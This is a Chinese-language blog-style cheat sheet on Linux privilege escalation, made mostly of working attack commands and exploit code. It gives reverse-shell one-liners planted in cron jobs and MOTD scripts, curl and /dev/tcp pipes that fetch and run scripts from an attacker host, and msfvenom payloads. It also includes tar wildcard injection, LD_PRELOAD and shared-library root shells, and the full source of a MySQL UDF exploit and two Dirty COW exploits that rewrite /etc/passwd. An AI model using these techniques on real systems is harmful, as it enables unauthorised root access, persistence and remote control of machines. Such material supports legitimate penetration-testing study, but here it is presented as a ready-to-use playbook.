---
title: Linux提权
published: 2023-03-25 13:43
tags: [Linux, 提权]
category: 系统
draft: false
---

# Linux提权

## root用户创建新用户

```bash
# 使用 useradd 命令添加用户
sudo useradd username
echo "username:x:0:0::/:/bin/sh" >> /etc/passwd       # 修改passwd添加用户，然后修改密码passwd username
# 设置用户密码
sudo passwd username
# 可选：为用户指定主目录
sudo useradd -d /path/to/home username
# 可选：为用户指定 shell
默认情况下，新用户的 shell 是 /bin/bash。如果你想要指定一个不同的 shell，可以使用 -s 选项：
sudo useradd -s /path/to/shell username
# 可选：为用户添加附加信息
sudo useradd -c "Full Name" username
# 可选：为用户创建主目录并复制默认配置
如果你希望在创建用户的同时创建主目录并复制默认配置文件，可以使用 -m 选项：
sudo useradd -m username
# 可选：为用户添加到组
sudo useradd -G group1,group2 username
```



## 安全机制

```
提权、免杀时需要对抗
```

```
ugo
suid sgid
Capabilities
AppArmor Selinux
ACL
```

```
Grsecurity
Pax
ExecShield
ASLR（Address Space Layout Randomization）
TOMOYO Linux
SMACK
Yama
CGroups
Linux Namespaces
StackGuard
Proplice
seccomp
ptrace
capsicum
Mprotect
chroot
firejail
```

## 原理

```
1、低权限可以修改可执行文件或者脚本，能以高权限身份运行
2、用低权限用户的运维人员也需要记忆输入备份凭据，以备高权限用户的时候完成操作
3、在权限的上层，在内存、CPU等，捕捉、拦截、修改凭据或者权限信息，操作敏感信息来实现的内核利用
```

## 枚举

```bash
高地权限第一步都是进行枚举，横向渗透、撕口子，首先需要一个交互性的shell
python -c 'import pty;pty.spawn("/bin/bash")'
stty raw -echo
export TERM=xterm-color
rlwrap nc -lvnp 4433  rlwrap命令可以包裹命令  # 提升交互性
```

### 自动枚举

```assembly
不足：产生流量特征、时间长、存在遗漏
提权阶段的工具
Linpeas  ## 新版本叫PEASS-ng
LinEnum
linux-smart-enumeration
linux-exploit-suggester
linuxprivchecker
unix-privesc-check
```

```bash
# 在线下载执行并不留下文件
curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20240324-2c3cd766/linpeas.sh | sh
```

#### 结果返回攻击机

##### 方法一

```bash
# 攻击机开启web服务
python -m http.server 8000
# 攻击机开启监听
nc -lvnp 8001 | tee linpeas.txt
```

```bash
# 靶机
curl 10.1.239.136/linpeas.sh | sh | nc 10.1.239.136 8001
```

```assembly
# 读结果，因为是二进制文件，使用less -r参数
less -r linpeas.txt
```

##### 方法二

```bash
# 攻击机开启监听并重定向输入linpeas.sh
nc -lvnp 8000 < linpeas.sh
```

```bash
# 靶机使用cat输入执行结果，通过伪设备进行通信这样就绕过了curl
cat < /dev/tcp/10.1.239.136/8000 | sh
```

### 手工枚举

```assembly
whoami
id        id root
who
w
last

# 内核
uname -a
lsb_release -a
cat /proc/version
hostnamectl

# 网卡
ip addr   ip a
ifconfig
ip route  # 路由表
arp -a
ip neigh  # 网络邻居

hostname
hostnamectl
sudo -l

# capabilities
getcap -r / 2>/dev/null  # 得到权限能力属性

ls -a
ls -liah
history
cat /etc/passwd
cat /etc/crontab
echc $PATH
ps -ef
ps -axjf  # x：未连接终端的进程 j：显示进程数 f：输出格式
ps -aux   # a：所有用户进程 u：显示启动进程的用户
top

netstat -au
netstat -l
netstat -at
netstat -s  # 网络统计
```

```assembly
find / -perm -u=s -type f 2>/dev/null  # 列出有suid的权限命令
# -perm -u=s: 这个选项用于指定要查找的文件权限。-perm表示按照指定的权限进行搜索，-u=s表示搜索具有 SetUID 权限的文件。SetUID 权限是一种特殊的权限设置，允许一个程序在执行时以文件所有者的身份运行，即使实际执行者可能不是文件所有者。
# -type f: 这个选项指定了要查找的文件类型，这里是普通文件。
which awk perl python ruby gcc vi vim nmap find netcat nc wget tftp tmux screen 2>/dev/null

cat /etc/fstab  # 检测没有被挂载的磁盘信息
```

## 服务漏洞利用

```bash
UDF   # user defined function
# 类似内置函数，通过UDF满足用户对数据库执行自定义操作
```

### 提权条件

```bash
# 1、掌握mysql数据库的账号，拥有create、insert、delete权限
# 2、secure_file_priv为空，这是用来限制：Load data、select into outfile、load_file()
```

### 利用

```bash
1、查找exp
searchsploit mysql udf
------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                           |  Path
------------------------------------------------------------------------- ---------------------------------
MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)   | linux/local/1181.c
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)  | linux/local/1518.c
MySQL 4.x/5.0 (Windows) - User-Defined Function Command Execution        | windows/remote/3274.txt
MySQL 4/5/6 - UDF for Command Execution                                  | linux/local/7856.txt
------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```c
2、使用1518.c
searchsploit mysql udf -m 1518
1518.c：
/*
 * $Id: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $
 *
 * raptor_udf2.c - dynamic library for do_system() MySQL UDF
 * Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This is an helper dynamic library for local privilege escalation through
 * MySQL run with root privileges (very bad idea!), slightly modified to work
 * with newer versions of the open-source database. Tested on MySQL 4.1.14.
 *
 * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c
 *
 * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes
 * for the security vulnerabilities in the handling of User Defined Functions
 * (UDFs) reported by Stefano Di Paola <stefano.dipaola@wisec.it>. For further
 * details, please refer to:
 *
 * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html
 * http://www.wisec.it/vulns.php?page=4
 * http://www.wisec.it/vulns.php?page=5
 * http://www.wisec.it/vulns.php?page=6
 *
 * "UDFs should have at least one symbol defined in addition to the xxx symbol
 * that corresponds to the main xxx() function. These auxiliary symbols
 * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and
 * xxx_add() functions". -- User Defined Functions Security Precautions
 *
 * Usage:
 * $ id
 * uid=500(raptor) gid=500(raptor) groups=500(raptor)
 * $ gcc -g -c raptor_udf2.c
 * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 * $ mysql -u root -p
 * Enter password:
 * [...]
 * mysql> use mysql;
 * mysql> create table foo(line blob);
 * mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
 * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
 * mysql> create function do_system returns integer soname 'raptor_udf2.so';
 * mysql> select * from mysql.func;
 * +-----------+-----+----------------+----------+
 * | name      | ret | dl             | type     |
 * +-----------+-----+----------------+----------+
 * | do_system |   2 | raptor_udf2.so | function |
 * +-----------+-----+----------------+----------+
 * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
 * mysql> \! sh
 * sh-2.05b$ cat /tmp/out
 * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
 * [...]
 *
 * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys
 *
 */

#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
        unsigned int            arg_count;      // number of arguments
        enum Item_result        *arg_type;      // pointer to item_result
        char                    **args;         // pointer to arguments
        unsigned long           *lengths;       // length of string args
        char                    *maybe_null;    // 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
        char                    maybe_null;     // 1 if func can return NULL
        unsigned int            decimals;       // for real functions
        unsigned long           max_length;     // for string functions
        char                    *ptr;           // free ptr for func data
        char                    const_item;     // 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
        if (args->arg_count != 1)
                return(0);

        system(args->args[0]);

        return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
        return(0);
}

// milw0rm.com [2006-02-20]
```

```bash
gcc -g -c filename.c -fPIC
-g # 指定生成调试信息
-c # 仅编译源代码，但不进行链接，通常会生成.o扩展名的文件，对于将多个源码文件分别编译成目标文件，然后链接成一个可执行文件或库时有用
-fPIC # 告诉编译器生成位置无关代码（position independent code）可以在内存中的任何位置执行，可以被多个程序共享
```

```
1、连接mysql数据库
2、show variables like '%secure_file_priv%'
3、show variables like '%plugin%'
%secure_file_priv%位置为空或者与%plugin%位置相同才可使用UDF提权
```

```bash
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;

# mysql.func可以执行系统命令
eg：select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

```bash
# 使用-p参数以特权用户来执行一个shell
/tmp/rootbash -p
```

## 提权利用

### shadow和passwd利用提权

#### 思路一

```bash
ls -liah /etc/shadow  # 查看权限
cat /etc/shadow | grep ':\$'  # 提取带有hash的用户
sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash  # 枚举破解
```

#### 思路二

```bash
ls -liah /etc/shadow  # 查看权限
cp /etc/shadow /tmp/shadow.bak  # 备份
# 生成用户密码hash，常用linux的密码hash类型由前面的$6$可以识别，一般是sha512
mkpasswd -m sha-512 123456  # 生成密码hash
# 写入shadow文件
```

#### 思路三

```bash
ls -liah /etc/passwd  # 查看权限
cp /etc/passwd /tmp/passwd.bak  # 备份
openssl passwd 123456  # 生成hash
# 生成的hash替换passwd的x，注意这里是通过可写的passwd来进行密码替换
```

### sudo环境变量提权

```bash
sudo -l  # 查看当前用户能执行什么系统命令
# env_reset, env_keep=LD_PRELOAD  加载共享库，可以提权
vim shell.c：
```

```c
#include <stdio.h>  # 标准输入输出库
#include <sys/types.h>  # 数据类型库
#include <stdlib.h>   # C语言标准库
#include <unistd.h>

void _init() {  # 预加载，执行的时候优先main函数
    unsetenv("LD_PRELOAD");  # 因为加载一遍就够了，开始执行之后就把环境变量预加载卸载掉
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/home/user/shell.so find  # 前提是find可以以root用户执行，预加载了环境变量提权逻辑
```

### 自动任务提权

#### 定时任务提权

```bash
cat /etc/crontab
# 存在计划任务
* * * * * root overwrite.sh
locate overwrite.sh  # 得到文件位置
└─# ll  /usr/local/bin/overwrite.sh        
-rwxr-xr-x 1 root root 56 Apr  1 09:20 /usr/local/bin/overwrite.sh

攻击机设置监听
sudo nc -lvnp 4444
靶机编写overwrite.sh
#!/bin/bash

bash -i >& /dev/tcp/10.1.239.136/4444 0>&1

echo -e "#!/bin/bash\n\nbash -i >& /dev/tcp/43.142.170.25/6677 0>&1" > 1.sh
printf '#!/bin/bash\n\nbash -i >& /dev/tcp/43.142.170.25/6677 0>&1' > 1.sh

# 一分钟后得到root权限
```

#### PATH环境变量提权

```bash
cat /crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/dcj:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
* * * * * root overwrite.sh

其中不只有命令
SHELL=/bin/sh
还有指定环境变量路径，存在/home/dcj:，可以直接在普通用户的环境变量目录中写文件执行
PATH=/home/dcj:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# PS：一般来说程序执行时会选取环境变量目录靠前的来执行，所以直接编写overwrite.sh在家目录即可
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
# 给执行权限
chmod +x overwrite.sh
# 执行
/tmp/rootbash -p
# -p 以root权限执行
获取root权限
```

#### 通配符提权

```bash
cat /etc/crontab
# 存在/usr/local/bin/compress.sh
# 查看文件内容是备份目录下所有内容到/tmp目录下，通常是管理员用来备份系统文件的命令
#!/bin/bash
cd /home/dcj/tmp
tar czf /tmp/backup.tar.gz *
# tar命令打包时有一个参数是检查点
--checkpoint-action=ACTION

1、构造反弹shell
sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.1.239.136 LPORT=4444 -f elf -o shell.elf

2、靶机下载
wget 10.1.239.136:8000/shell.elf

3、检查点命令
# 在靶机的这个目录下创建检查点
touch /home/dcj/tmp/--checkpoint=1
touch /home/dcj/tmp/--checkpoint-action=exec=sh ./1.sh
touch /home/dcj/tmp/--checkpoint-action=exec=shell.elf

4、监听
sudo nc -lvnp 4444
```

### SUID提权

#### 可执行文件已知利用提权

```bash
find / -perm -u=s -type f 2>/dev/null
# 利用exim-4.84
searchsploit exim
chmod +x 39535.sh
./39535.sh
```

#### 共享库注入

```bash
find / -perm -u=s -type f 2>/dev/null
strace 命令  # 追踪查看命令运行内容
# 运行了.so文件这里可以被利用
eg：调用了/home/dcj/libcalc.so
编写libcalc.c
```

```c
#include <stdio.h>
#include <stdblib.h>
#include <unistd.h>

static void inject() __attribute__((constructor));

void inject() {
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
```

```bash
static void inject()：这是一个函数声明，函数名为 inject，返回类型为 void，表示该函数不返回任何值。static 关键字表示该函数只在当前文件（共享对象文件）中可见，不能被其他文件访问。

_attribute__((constructor))：这是 GCC 和兼容的编译器提供的一个特殊属性，用于将函数标记为构造函数（constructor）。构造函数是一种特殊的函数，它在程序开始执行之前自动被调用。在这个例子中，inject 函数被标记为构造函数，因此它将在共享对象文件被加载时自动执行。

# PS：本来是要用管理员权限的程序调用这个.so文件来进行提权，没有调用的环境，这里编写了一个C程序进行调用，需要用管理员用户执行这个C程序

验证，编写load_and_execute.c
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

int main() {
    void *handle;
    void (*inject_function)();

    // 打开共享对象文件
    handle = dlopen("./libcalc.so", RTLD_LAZY);
    if (!handle) {
        fprintf(stderr, "无法打开共享对象文件: %s\n", dlerror());
        return 1;
    }

    // 获取共享对象文件中的inject函数
    inject_function = dlsym(handle, "inject");
    if (!inject_function) {
        fprintf(stderr, "无法获取inject函数: %s\n", dlerror());
        dlclose(handle);
        return 1;
    }

    // 调用inject函数
    (*inject_function)();

    // 关闭共享对象文件
    dlclose(handle);

    return 0;
}
```

```bash
gcc -o load_and_execute sudoload_and_execute.c -ldl
# -ldl是GCC编译器的一个参数，用于指定链接程序时需要链接的动态链接库。在Linux系统中，-ldl用于链接libdl库，该库包含了动态链接器的相关函数，如dlopen()、dlsym()等。
sudo ./load_and_execute.c
```

#### 环境变量利用提权

```bash
find / -perm -u=s -type f 2>/dev/null

# 这里使用的suid-env

strings /usr/local/bin/suid-env  # 查看使用了什么字符串，能够看到存在service apache2 start，启动了apache2服务，这里用的是相对路径，不是绝对路径，可以进行劫持，构造service，不是原本的service，让它执行我们的service，这里用C语言编写一个服务
编写service.c
```

```c
#include <sidio.h>
#include <stdlib.h>
#include <unistd.h>

void main() {
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
```

```bash
gcc -o service service.c

# 编写的服务在当前路径下，但是环境变量中并没有写上这个路径，所以需要将当前目录加到环境变量中

export PATH=.:$PATH

# 执行后调用了service命令得到shell
```

#### 巧用shell功能#1

```bash
find / -perm -u=s -type f 2>/dev/null

# 这次的suid-env2命令中服务写上了路径/usr/sbin/service apache2 start
查看当前bash版本
bash -version  4.1.5
# 小于4.2时可以使用路径组合来作为文件名
function /usr/sbin/service { /bin/bash -p; }
# 相当于用函数名劫持了真正的service命令
# 然后再加上环境变量，-f指加入环境变量的是函数
export -f /usr/sbin/service
# 执行有suid权限且调用了/usr/sbin/service apache2 start的那条命令即可
```

#### 巧用shell功能#2

```bash
find / -perm -u=s -type f 2>/dev/null

# 这次的suid-env2命令中服务写上了路径/usr/sbin/service apache2 start
查看当前bash版本
bash -version  4.1.5
# 小于4.4时可以考虑在调试模式下对bash的环境变量进行设置，放进我们可以执行的代码

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
# -i  忽略当前已有的任何环境变量的选项
# SHELLOPTS  环境变量的选项集，可以有多个选项用冒号分隔
# xtrace  指shell执行每个命令前先打印这个命令
# PS4  Prompt String提示字符串，PS4结合xtrace使用，bash版本在4.4以下就可以在PS4这个提示字符串命令下加入提权命令
```

### 密码和密钥提权

#### 历史文件提权

```bash
history  # 查看历史命令
cat ~/.*history | less
cat /root/.bash_history
cat .viminfo
```

#### 配置文件查看提权

```bash
# 查找可能存在的配置文件：网站、应用、数据库、ssh、vpn……
eg：pwd
ls -liah
cat myvpn.ovpn
cat /etc/openvpn/auth.txt
```

#### ssh密钥敏感信息提权

```bash
# ssh相关文件、系统目录下.ssh文件夹
存在私钥key
vim rd_rsa
chmod 600 id_rsa
sudo ssh -i id_rsa -oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss -oHostKeyAlgorithms=ssh-rsa,ssh-dss root@10.1.239.136
# oHostKeyAlgorithms=ssh-rsa,ssh-dss  指定算法类型
# oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss  指定能够接受的公钥类型，这样就有了共同的签名
```

### NFS提权

```bash
NFS  共享文件模式（网络、文件、分享），可以用来撕口子，也可以用来提权

# 需要靶机是否存在NSF服务
cat /etc/exports
# 如果存在no_root_squash表示可以进行NSF提权利用尝试
mkdir /tmp/nfs
# 本地使用，挂载到目标靶机上的/tmp目录下
mount -o rw,vers=3 靶机IP:/tmp /tmp/nfs
# 生成一个shell
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
# 靶机中执行即可
/tmp/shell.elf
```

### 内核利用提权

```bash
uname -a  # 查看内核版本 2.6.32
# 使用linpeas查看内核存在的漏洞，存在dirtycow(脏牛)漏洞
searchsploit 40611
-------------------------------------------------------------------------------------------- --------------------
 Exploit Title                                                                              |  Path
-------------------------------------------------------------------------------------------- --------------------
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access Method) | linux/local/40611.c
-------------------------------------------------------------------------------------------- --------------------
Shellcodes: No Results

searchsploit -m 40611
40611.c：
/*
####################### dirtyc0w.c #######################
$ sudo -s
# echo this is not a test > foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -pthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
####################### dirtyc0w.c #######################
*/
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
> This is achieved by racing the madvise(MADV_DONTNEED) system call
> while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}

void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
>  The in the wild exploit we are aware of doesn't work on Red Hat
>  Enterprise Linux 5 and 6 out of the box because on one side of
>  the race it writes to /proc/self/mem, but /proc/self/mem is not
>  writable on Red Hat Enterprise Linux 5 and 6.
*/
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<100000000;i++) {
/*
You have to reset the file pointer to the memory position.
*/
    lseek(f,(uintptr_t) map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}


int main(int argc,char *argv[])
{
/*
You have to pass two arguments. File and Contents.
*/
  if (argc<3) {
  (void)fprintf(stderr, "%s\n",
      "usage: dirtyc0w target_file new_content");
  return 1; }
  pthread_t pth1,pth2;
/*
You have to open the file in read only mode.
*/
  f=open(argv[1],O_RDONLY);
  fstat(f,&st);
  name=argv[1];
/*
You have to use MAP_PRIVATE for copy-on-write mapping.
> Create a private copy-on-write mapping.  Updates to the
> mapping are not visible to other processes mapping the same
> file, and are not carried through to the underlying file.  It
> is unspecified whether changes made to the file after the
> mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %zx\n\n",(uintptr_t) map);
/*
You have to do it on two threads.
*/
  pthread_create(&pth1,NULL,madviseThread,argv[1]);
  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
/*
You have to wait for the threads to finish.
*/
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
# 编译
gcc -pthread dirtyc0w.c -o dirtyc0w
# 执行
./dirtyc0w
# 40611是写入方法（Write Access Method），用的是写入内存，调用麻烦

40839.c：
//
// This exploit uses the pokemon exploit of the dirtycow vulnerability
// as a base and automatically generates a new passwd line.
// The user will be prompted for the new password when the binary is run.
// The original /etc/passwd file is then backed up to /tmp/passwd.bak
// and overwrites the root account with the generated line.
// After running the exploit you should be able to login with the newly
// created user.
//
// To use this exploit modify the user values according to your needs.
//   The default is "firefart".
//
// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
//
// Compile with:
//   gcc -pthread dirty.c -o dirty -lcrypt
//
// Then run the newly create binary by either doing:
//   "./dirty" or "./dirty my-new-password"
//
// Afterwards, you can either "su firefart" or "ssh firefart@..."
//
// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
//   mv /tmp/passwd.bak /etc/passwd
//
// Exploit adopted by Christian "FireFart" Mehlmauer
// https://firefart.at
//

#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/etc/passwd";
const char *backup_filename = "/tmp/passwd.bak";
const char *salt = "firefart";

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

struct Userinfo {
   char *username;
   char *hash;
   int user_id;
   int group_id;
   char *info;
   char *home_dir;
   char *shell;
};

char *generate_password_hash(char *plaintext_pw) {
  return crypt(plaintext_pw, salt);
}

char *generate_passwd_line(struct Userinfo u) {
  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
  int size = snprintf(NULL, 0, format, u.username, u.hash,
    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
  char *ret = malloc(size + 1);
  sprintf(ret, format, u.username, u.hash, u.user_id,
    u.group_id, u.info, u.home_dir, u.shell);
  return ret;
}

void *madviseThread(void *arg) {
  int i, c = 0;
  for(i = 0; i < 200000000; i++) {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}

int copy_file(const char *from, const char *to) {
  // check if target file already exists
  if(access(to, F_OK) != -1) {
    printf("File %s already exists! Please delete it and run again\n",
      to);
    return -1;
  }

  char ch;
  FILE *source, *target;

  source = fopen(from, "r");
  if(source == NULL) {
    return -1;
  }
  target = fopen(to, "w");
  if(target == NULL) {
     fclose(source);
     return -1;
  }

  while((ch = fgetc(source)) != EOF) {
     fputc(ch, target);
   }

  printf("%s successfully backed up to %s\n",
    from, to);

  fclose(source);
  fclose(target);

  return 0;
}

int main(int argc, char *argv[])
{
  // backup file
  int ret = copy_file(filename, backup_filename);
  if (ret != 0) {
    exit(ret);
  }

  struct Userinfo user;
  // set values, change as needed
  user.username = "firefart";
  user.user_id = 0;
  user.group_id = 0;
  user.info = "pwned";
  user.home_dir = "/root";
  user.shell = "/bin/bash";

  char *plaintext_pw;

  if (argc >= 2) {
    plaintext_pw = argv[1];
    printf("Please enter the new password: %s\n", plaintext_pw);
  } else {
    plaintext_pw = getpass("Please enter the new password: ");
  }

  user.hash = generate_password_hash(plaintext_pw);
  char *complete_passwd_line = generate_passwd_line(user);
  printf("Complete line:\n%s\n", complete_passwd_line);

  f = open(filename, O_RDONLY);
  fstat(f, &st);
  map = mmap(NULL,
             st.st_size + sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
  printf("mmap: %lx\n",(unsigned long)map);
  pid = fork();
  if(pid) {
    waitpid(pid, NULL, 0);
    int u, i, o, c = 0;
    int l=strlen(complete_passwd_line);
    for(i = 0; i < 10000/l; i++) {
      for(o = 0; o < l; o++) {
        for(u = 0; u < 10000; u++) {
          c += ptrace(PTRACE_POKETEXT,
                      pid,
                      map + o,
                      *((long*)(complete_passwd_line + o)));
        }
      }
    }
    printf("ptrace %d\n",c);
  }
  else {
    pthread_create(&pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth,NULL);
  }

  printf("Done! Check %s to see if the new user was created.\n", filename);
  printf("You can log in with the username '%s' and the password '%s'.\n\n",
    user.username, plaintext_pw);
    printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
    backup_filename, filename);
  return 0;
}
# 编译
gcc 40839.c -o dirty -lcrypt
./dirty
# 输入密码
# 创建用户成功，使用密码登录

gcc -pthread dirty.c -o dirty -lcrypt
```

### doas less+vi提权

```bash
uname -a
# 系统为openBSD
find / -group user -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
# 存在/usr/bin/doas

cat /etc/doas.conf
permit nopass keepenv dcj as root cmd /usr/bin/less args /home/dcj/tmp/test.txt
permit nopass keepenv root as root
# 允许的权限在没有密码的情况下，保持环境变量，user的用户可以按照root用户来执行，可以执行/usr/bin/less args /var/log/authlog

# 原理是less命令中有一个v参数，表示查看文件时使用vi编辑器进行编辑
# 进入编辑器
doas /usr/bin/less /home/dcj/tmp/test.txt
# 按v
输入:!sh
# 返回了root权限的shell
```

### 利用MOTD机制提权

```bash
MOTD（message of the day）当登录linux服务器的时候会显示一些欢迎信息

# 在Linux中，/etc/update-motd.d目录下的脚本和程序是以root用户的身份运行的
# /etc/motd是一个文本文件，用于在用户登录系统时显示一条消息。该消息通常用于向用户提供系统的重要信息、公告、警告或其他相关通知

# 理论上修改 motd 下的任何文件都可,提权时通常修改 /etc/update-motd.d/00-header 文件
echo "bash -c 'bash -i >& /dev/tcp/10.1.239.136/4444 0>&1'" >> /etc/update-motd.d/00-header
# 开启监听
sudo nc -lnvp 4444
```

### 可预测PRNG暴力破解SSH提权

```bash
当有服务器的公钥时，需要用自己的私钥进行登录，但是并没有对应的私钥，这里需要用一个库，伪随机数生成器————PRNG（pseudo random number generator）

└─$ searchsploit prng
----------------------------------------------------------------------------------- ---------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------
GNU Classpath 0.97.2 - 'gnu.java.security.util.PRNG' Class Entropy (1)             | multiple/remote/32673.java
GNU Classpath 0.97.2 - 'gnu.java.security.util.PRNG' Class Entropy (2)             | multiple/remote/32674.cpp
LPRng (RedHat 7.0) - 'lpd' Format String                                           | linux/remote/227.c
LPRng - use_syslog Remote Format String (Metasploit)                               | linux/remote/16842.rb
LPRng 3.6.22/23/24 - Remote Command Execution                                      | linux/remote/226.c
LPRng 3.6.24-1 - Remote Command Execution                                          | linux/remote/230.c
LPRng 3.6.x - Failure To Drop Supplementary Groups                                      | unix/local/20923.c
LPRNG html2ps 1.0 - Remote Command Execution                                            | unix/remote/21974.pl
OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH | linux/remote/5622.txt
OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH | linux/remote/5720.py
OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH (Ruby) | linux/remote/5632.rb
----------------------------------------------------------------------------------- ---------------------------
Shellcodes: No Results

# 实际上，获得立足点和提权场景的操作是完全一样的

# 使用5622.txt
searchsploit -m 5622
5622.txt：
the debian openssl issue leads that there are only 65.536 possible ssh
keys generated, cause the only entropy is the pid of the process
generating the key.

This leads to that the following perl script can be used with the
precalculated ssh keys to brute force the ssh login. It works if such a
keys is installed on a non-patched debian or any other system manual
configured to.

On an unpatched system, which doesn't need to be debian, do the following:

keys provided by HD Moore - http://metasploit.com/users/hdm/tools/debian-openssl/
***E-DB Note: Mirror ~ https://github.com/g0tmi1k/debian-ssh***

1. Download http://sugar.metasploit.com/debian_ssh_rsa_2048_x86.tar.bz2
